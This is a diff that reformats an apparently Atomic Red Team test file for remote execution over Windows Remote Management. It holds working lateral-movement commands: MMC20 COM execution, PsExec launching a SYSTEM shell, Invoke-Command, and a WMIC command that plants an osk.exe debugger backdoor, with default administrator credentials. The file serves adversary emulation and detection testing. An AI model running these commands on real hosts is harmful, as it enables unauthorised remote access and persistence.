@@ -3,134 +3,134 @@ attack_technique: T1028
 display_name: Windows Remote Management
 
 atomic_tests:
-- name: Enable Windows Remote Management
-  description: |
-    Powershell Enable WinRM
+  - name: Enable Windows Remote Management
+    description: |
+      Powershell Enable WinRM
 
-    Upon successful execution, powershell will "Enable-PSRemoting" allowing for remote PS access. 
+      Upon successful execution, powershell will "Enable-PSRemoting" allowing for remote PS access.
 
-  supported_platforms:
-    - windows
+    supported_platforms:
+      - windows
 
-  executor:
-    name: powershell
-    elevation_required: true
-    command: |
-      Enable-PSRemoting -Force
+    executor:
+      name: powershell
+      elevation_required: true
+      command: |
+        Enable-PSRemoting -Force
 
-- name: PowerShell Lateral Movement
-  description: |
-    Powershell lateral movement using the mmc20 application com object.
+  - name: PowerShell Lateral Movement
+    description: |
+      Powershell lateral movement using the mmc20 application com object.
 
-    Reference:
+      Reference:
 
-    https://blog.cobaltstrike.com/2017/01/24/scripting-matt-nelsons-mmc20-application-lateral-movement-technique/
+      https://blog.cobaltstrike.com/2017/01/24/scripting-matt-nelsons-mmc20-application-lateral-movement-technique/
 
-    Upon successful execution, cmd will spawn calc.exe on a remote computer. 
+      Upon successful execution, cmd will spawn calc.exe on a remote computer.
 
-  supported_platforms:
-    - windows
+    supported_platforms:
+      - windows
 
-  input_arguments:
-    computer_name:
-      description: Name of Computer
-      type: string
-      default: computer1
+    input_arguments:
+      computer_name:
+        description: Name of Computer
+        type: string
+        default: computer1
 
-  executor:
-    name: command_prompt
-    command: |
-      powershell.exe [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","#{computer_name}")).Documnet.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe", $null, $null, "7")
+    executor:
+      name: powershell
+      command: |
+        [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","#{computer_name}")).Documnet.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe", $null, $null, "7")
 
-- name: WMIC Process Call Create
-  description: |
-    Utilize WMIC to start remote process.
+  - name: WMIC Process Call Create
+    description: |
+      Utilize WMIC to start remote process.
 
-    Upon successful execution, cmd will utilize wmic.exe to modify the registry on a remote endpoint to swap osk.exe with cmd.exe.
+      Upon successful execution, cmd will utilize wmic.exe to modify the registry on a remote endpoint to swap osk.exe with cmd.exe.
 
-  supported_platforms:
-    - windows
+    supported_platforms:
+      - windows
 
-  input_arguments:
-    user_name:
-      description: Username
-      type: String
-      default: DOMAIN\Administrator
-    password:
-      description: Password
-      type: String
-      default: P@ssw0rd1
-    computer_name:
-      description: Target Computer Name
-      type: String
-      default: Target
+    input_arguments:
+      user_name:
+        description: Username
+        type: String
+        default: DOMAIN\Administrator
+      password:
+        description: Password
+        type: String
+        default: P@ssw0rd1
+      computer_name:
+        description: Target Computer Name
+        type: String
+        default: Target
 
-  executor:
-    name: command_prompt
-    command: |
-      wmic /user:#{user_name} /password:#{password} /node:#{computer_name} process call create "C:\Windows\system32\reg.exe add \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe\" /v \"Debugger\" /t REG_SZ /d \"cmd.exe\" /f"
+    executor:
+      name: command_prompt
+      command: |
+        wmic /user:#{user_name} /password:#{password} /node:#{computer_name} process call create "C:\Windows\system32\reg.exe add \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe\" /v \"Debugger\" /t REG_SZ /d \"cmd.exe\" /f"
 
-- name: Psexec
-  description: |
-    Utilize psexec to start remote process.
+  - name: Psexec
+    description: |
+      Utilize psexec to start remote process.
 
-    Upon successful execution, cmd will utilize psexec.exe to spawn cmd.exe on a remote system.
+      Upon successful execution, cmd will utilize psexec.exe to spawn cmd.exe on a remote system.
 
-  supported_platforms:
-    - windows
+    supported_platforms:
+      - windows
 
-  input_arguments:
-    user_name:
-      description: Username
-      type: String
-      default: DOMAIN\Administrator
-    password:
-      description: Password
-      type: String
-      default: P@ssw0rd1
-    computer_name:
-      description: Target Computer Name
-      type: String
-      default: localhost
-    psexec_exe:
-      description: Path to PsExec
-      type: string
-      default: "C:\\PSTools\\PsExec.exe"
+    input_arguments:
+      user_name:
+        description: Username
+        type: String
+        default: DOMAIN\Administrator
+      password:
+        description: Password
+        type: String
+        default: P@ssw0rd1
+      computer_name:
+        description: Target Computer Name
+        type: String
+        default: localhost
+      psexec_exe:
+        description: Path to PsExec
+        type: string
+        default: "C:\\PSTools\\PsExec.exe"
 
-  dependencies:
-    - description: |
-        PsExec tool from Sysinternals must exist on disk at specified location (#{psexec_exe})
-      prereq_command: |
-        if (Test-Path "#{psexec_exe}"") { exit 0} else { exit 1}
-      get_prereq_command: |
-        Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip"
-        Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
-        New-Item -ItemType Directory ("#{psexec_exe}") -Force | Out-Null
-        Copy-Item $env:TEMP\PsTools\PsExec.exe "#{psexec_exe}" -Force
+    dependencies:
+      - description: |
+          PsExec tool from Sysinternals must exist on disk at specified location (#{psexec_exe})
+        prereq_command: |
+          if (Test-Path "#{psexec_exe}"") { exit 0} else { exit 1}
+        get_prereq_command: |
+          Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip"
+          Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
+          New-Item -ItemType Directory ("#{psexec_exe}") -Force | Out-Null
+          Copy-Item $env:TEMP\PsTools\PsExec.exe "#{psexec_exe}" -Force
 
-  executor:
-    name: command_prompt
-    command: |
-      #{psexec_exe} \\#{computer_name} -u #{user_name} -p #{password} -s cmd.exe
+    executor:
+      name: command_prompt
+      command: |
+        #{psexec_exe} \\#{computer_name} -u #{user_name} -p #{password} -s cmd.exe
 
-- name: Invoke-Command
-  description: |
-    Execute Invoke-command on remote host.
+  - name: Invoke-Command
+    description: |
+      Execute Invoke-command on remote host.
 
-    Upon successful execution, powershell will execute ipconfig on localhost using `invoke-command`.
+      Upon successful execution, powershell will execute ipconfig on localhost using `invoke-command`.
 
-  supported_platforms:
-    - windows
-  input_arguments:
-    host_name:
-      description: Remote Windows Host Name
-      type: String
-      default: localhost
-    remote_command:
-      description: Command to execute on remote Host
-      type: String
-      default: ipconfig
-  executor:
-    name: powershell
-    command: |
-      invoke-command -ComputerName #{host_name} -scriptblock {#{remote_command}}
+    supported_platforms:
+      - windows
+    input_arguments:
+      host_name:
+        description: Remote Windows Host Name
+        type: String
+        default: localhost
+      remote_command:
+        description: Command to execute on remote Host
+        type: String
+        default: ipconfig
+    executor:
+      name: powershell
+      command: |
+        invoke-command -ComputerName #{host_name} -scriptblock {#{remote_command}}
